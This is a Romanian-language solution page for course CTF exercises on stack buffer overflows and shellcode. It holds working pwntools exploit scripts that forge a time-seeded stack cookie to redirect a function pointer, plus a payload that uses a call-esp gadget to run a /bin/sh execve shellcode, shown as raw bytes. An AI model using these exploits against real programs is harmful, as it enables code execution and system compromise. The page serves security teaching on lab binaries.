---
slug: /solve-bof-shellcode
sidebar_position: 2
---

# Suprascrierea Stivei. Shellcodes

## 1 - Suprascrierea Stivei 🏁

### Flag

`SI{A_BALANCED_DIET_IS_A_COOKIE_IN_EACH_HAND}`

### Rezolvare

În urma unei analize statice, se poate observa faptul că programul, odată rulat, va aștepta conexiuni pe `0.0.0.0`, pe un port dat ca argument. Atunci când un client se conectează, se va aștepta un text, lungimea maximă fiind mai mare decât lungimea *buffer*-ului alocat pe stivă. Astfel, o tehnică de exploatare poate fi *buffer overflow*.

Pe stiva funcției `serve_new_member`, se salvează următoarele variabile:

- *Buffer*-ul textului utilizatorului; și
- O protecție a stivei, numită *stack cookie*, ce este o valoare calculata prin formula:

```c
srand(time(0));
cookie = rand() % time(0);
```

- Un *pointer* către o funcție cu un parametru de tip întreg, ce va fi apelată dacă verificarea *stack cookie*-ului va fi trecuta.

Astfel, structura stivei la apelarea funcției `serve_new_member` este următoarea:

```text
+-------------------------------------------+
| buffer                         | 28 bytes |
+-------------------------------------------+
| stack cookie                   | 4 bytes  |
+-------------------------------------------+
| function pointer               | 4 bytes  |
+-------------------------------------------+
| old base pointer               | 4 bytes  |
+-------------------------------------------+
| old instruction pointer        | 4 bytes  |
+-------------------------------------------+
```

Tot prin analiză statică, putem vedea că funcția `send_flag` are același prototip ca `send_fail`, putând să ne folosim de adresa ei pentru a suprascrie *pointer*-ul salvat pe stivă. Structura *payload*-ului va fi astfel:

```text
+---------------------+----------------------------------+---------------------------------+
|                     |                                  |                                 |
| 28 bytes of garbage | 4 bytes of computed stack cookie | 4 bytes of pointer to send_flag |
|                     |                                  |                                 |
+---------------------+----------------------------------+---------------------------------+
```

Program următor va fi numit `generate_cookie.c` și este scris în C. El se va ocupa de calcularea valorii *stack cookie*-ului.

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main(){

    int random_value, cookie, now;

    now = time(0);
    srand(now);
    random_value = rand();
    cookie = random_value % now;
    printf("%d", cookie);

}
```

In *script*-ul de mai jos, s-a folosit Python 3 (împreună cu modulul `pwntools`) și programul de mai sus, compilat cu comanda `gcc -o generate_cookie.elf generate_cookie.c`

```python
#!/usr/bin/env python3

import sys
import subprocess

from pwn import log, elf, process, p32

EXECUTABLE_PATH = "cookie_lover.elf"
COOKIE_GENERATOR_PATH = "./generate_cookie.elf"
FLAG_PREFIX = b"SI{"
FLAG_SUFFIX = "}"
PAYLOAD_FILE = "payload.bin"


def main() -> None:
    # Preia simbolul funcției send_flag
    executable = elf.ELF(EXECUTABLE_PATH, checksec=False)
    send_flag = executable.symbols["send_flag"]
    log.info("Adresa funcției send_flag este {}.".format(hex(send_flag)))

    # Creează un proces nou pe baza executabilului
    p = process.process(EXECUTABLE_PATH)
    output = p.recv(timeout=0.1)

    # Lansează un proces pentru generarea unui stack cookie
    cookie = process.process(COOKIE_GENERATOR_PATH).recvall()
    cookie = int(cookie)
    log.info("Stack cookie-ul generat este {}.".format(cookie))

    # Creează payload-ul de forma:
    # OVERFLOW_GARBAGE + COOKIE + SEND_FLAG_SYMBOL + REST_GARBAGE
    payload = 28 * b'a'
    payload += p32(cookie)
    payload += p32(send_flag)
    payload += (64 - 28 - 2 * 4) * b'a'

    # Scrie payload-ul într-un fișier
    payload_file = open(PAYLOAD_FILE, "wb")
    payload_file.write(payload)
    payload_file.close()

    # Trimite payload-ul și verifică textul întors
    p.send(payload)
    final_output = p.recvall()
    if (final_output.find(FLAG_PREFIX) != -1):
        final_output = final_output[:-2].decode("utf-8")
        log.success(
            "Exploit-ul a avut succes. Textul ce conține flag-ul este:\n{}".
            format(final_output))
    else:
        log.failure(
            "Exploit-ul pare ca nu funcționează. Textul returnat este:\n{}\n".
            format(final_output))
    p.close()


if __name__ == "__main__":
    main()
```

Odată rulat, următoarele sunt afișate în consolă:

```bash
$ ./exploit.py
[*] Adresa functiei send_flag este 0x80492af.
[+] Starting local process '../../Exerciții/cookie_lover/cookie_lover.elf': pid 15554
[+] Starting local process './generate_cookie.elf': pid 15556
[+] Receiving all data: Done (9B)
[*] Process './generate_cookie.elf' stopped with exit code 0 (pid 15556)
[*] Stack cookie-ul generat este 353780496.
[+] Receiving all data: Done (150B)
[*] Process '../../Exerciții/cookie_lover/cookie_lover.elf' stopped with exit code -11 (SIGSEGV) (pid 15554)
[+] Exploit-ul a avut succes. Textul ce contine flag-ul este:
    You demonstate us that you are a true cookie lover. You did't even smash one!
    Here is a reward for you: SI{A_BALANCED_DIET_IS_A_COOKIE_IN_EACH_HAND}
```

## 2 - Crearea și Testarea unui *Shellcode* 💁

Funcționalitatea codului în limbaj de asamblare din fișierul dat este următoarea:

```asm
BITS 32
    push 0x0a2173   ; Plasează pe stivă a șirului de caractere "\n!s".
    push 0x776f6c6c ; Plasează pe stivă a șirului de caractere "woll".
    push 0x65662073 ; Plasează pe stivă a șirului de caractere "ef s".
    push 0x62614c70 ; Plasează pe stivă a șirului de caractere "baLp".
    push 0x78456e69 ; Plasează pe stivă a șirului de caractere "xEni".
    push 0x42202c6f ; Plasează pe stivă a șirului de caractere "B ,o".
    push 0x6c6c6548 ; Plasează pe stivă a șirului de caractere "lleH".
    mov edx, 27     ; Setează lungimea șirului de caractere.
    mov ecx, esp    ; Setează mesajul printr-un pointer către stivă.
    mov ebx, 1      ; Utilizează stdout.
    mov eax, 4      ; Setează apelul de sistem write.
    int 0x80        ; Apelează.
    mov ebx, 0      ; Setează codul de retur.
    mov eax, 1      ; Setează apelul de sistem exit.
    int 0x80        ; Apelează.
    ret
```

Odată asamblat, codul obiect este folosit pentru popularea celor două fișiere C.

Pentru fișierul `execution_from_stack.c`, este relevantă opțiunea cu care este compilat programul, și anume `-z execstack`. Acesta face ca stiva să fie executabilă (conform cu rezultatul din `gdb`, prezentat mai jos) și ca acel apel către codul salvat în variabila `shellcode` să fie efectuat corect. Este de menționat aici faptul că permisiunile de scriere și execuție nu se găsesc împreună pe sistemele moderne, datorită Data Execution Prevention (abreviat DEP), însă aici marcăm explicit stiva ca fiind executabilă în scop pur didactic, pentru a demonstra execuția *shellcode*-ului.

```bash
$ gdb ./execution_from_stack.elf
[...]
gdb-peda$ break main
[...]
gdb-peda$ run
[...]
gdb-peda$ vmmap
[...]
0xfffdc000 0xffffe000 rwxp  [stack]
```

Pe de altă parte, fișierul `execution_with_mprotect.c` folosește un mecanism diferit. Se mapează în memorie codul mașină (apelurile `mmap` și `memcpy`), iar zona alocată este marcată ca având toate permisiunile (apel către `mprotect`, cu parametrul `PROT_READ | PROT_WRITE | PROT_EXEC`). Acest lucru permite execuția codului în ciuda DEP.

```bash
$ strace ./execution_with_mprotect.elf
[...]
mmap2(NULL, 1, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0) = 0xf7f76000
mprotect(0xf7f76000, 1, PROT_READ|PROT_WRITE|PROT_EXEC) = 0
```

## 3 - Folosirea Apelului de Sistem `execve` în *Shellcode* 💁

Analizând într-un dezasamblor (eventual și decompilator), deducem faptul că programul ia ca argumente două valori: numele unui fișier, al cărui conținut îl citește într-un *buffer*, și numărul de paragrafe pe care textul trebuie să îl atingă sau depășească. Din cauza lungimii fixe a *buffer*-ului, programul este vulnerabil la o suprascriere a acestuia.

Putem genera un fișier cu o lungime care să o depășească pe cea a *buffer*-ului (1100 de caractere sunt suficiente) din interpretorul în linie de comandă a Python 3.

```python
from pwnlib.util.cyclic import *
generator = cyclic_gen()
garbage_payload = generator.get(1100)
open("payload.bin", "wb").write(garbage_payload)
```

Dând numele fișierul generat (`payload.bin`) ca argument executabilului, observăm că o eroare este produsă. Din ieșirea comenzii `dmesg`, putem observa că registrul `eip` a fost suprascris cu o valoare care nu poate fi dereferențiată. Luând acea valoare și convertind-o în ASCII (obținând un șir de caractere pe care în notăm cu `EIP_VALUE`), putem afla distanța dintre începutul *buffer*-ului și valoarea ce suprascrie registrul `eip` tot din interpretorul deschis anterior, cu ajutorul comenzii `generator.find(EIP_VALUE)`.

Vizitând *website*-ul menționat în enunț, putem alege un *shellcode* care să lanseze un *shell* (de exemplu, [acesta](http://shell-storm.org/shellcode/files/shellcode-841.php)). Copiind șirul de octeți ce îl reprezintă într-un fișier numit `shellcode.bin`, putem folosi comanda `objdump -b binary -m i386 -D shellcode.bin` pentru a-l dezasambla.

```text
shellcode.bin:     file format binary

Disassembly of section .data:

00000000 <.data>:
   0:   31 c9                   xor    ecx,ecx
   2:   f7 e1                   mul    ecx
   4:   b0 0b                   mov    al,0xb
   6:   51                      push   ecx
   7:   68 2f 2f 73 68          push   0x68732f2f
   c:   68 2f 62 69 6e          push   0x6e69622f
  11:   89 e3                   mov    ebx,esp
  13:   cd 80                   int    0x80
  15:   0a                      .byte 0xa
```

*Payload*-ul final se va folosi și de simbolul menționat, `helper`. Acesta execută instrucțiunea `call %esp`, ceea ce mută fluxul programului pe stivă, octeții executați fiind cei imediat de sub adresa de retur.

Structura *payload*-ului este următoarea:

```text
+-----------------------+-------------------------------+-----------+
|                       |                               |           |
| 1052 bytes of garbage | 4 bytes for address of helper | shellcode |
|                       |                               |           |
+-----------------------+-------------------------------+-----------+
```

Crearea *payload*-ului și exploatarea efectivă a programului pot fi găsite în *script*-ul de mai jos.

```python
#!/usr/bin/env python3

from pwnlib import elf
from pwnlib.tubes import process
from pwnlib.util.packing import p32
from pwn import log

EXECUTABLE_PATH = "../../Exerciții/essay-checker/essay-checker.elf"
HELPER_SYMBOL = "helper"
EIP_OFFSET = 1052
BIN_SH_SHELLCODE = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
PAYLOAD_FILENAME = "payload.bin"


def main() -> None:
    # Preia simbolul funcției helper
    executable = elf.ELF(EXECUTABLE_PATH, checksec=False)
    helper_address = executable.symbols[HELPER_SYMBOL]
    log.info("Adresa funcției '{}' este {}.".format(HELPER_SYMBOL,
                                                    hex(helper_address)))

    # Creează payload-ul și salvează-l într-un fișier
    payload = EIP_OFFSET * b'a' + p32(helper_address) + BIN_SH_SHELLCODE
    open(PAYLOAD_FILENAME, "wb").write(payload)

    # Creează un proces nou pe baza executabilului
    p = process.process([EXECUTABLE_PATH, PAYLOAD_FILENAME, "0"])
    p.recv(timeout=0.1)
    p.interactive()


if __name__ == "__main__":
    main()
```
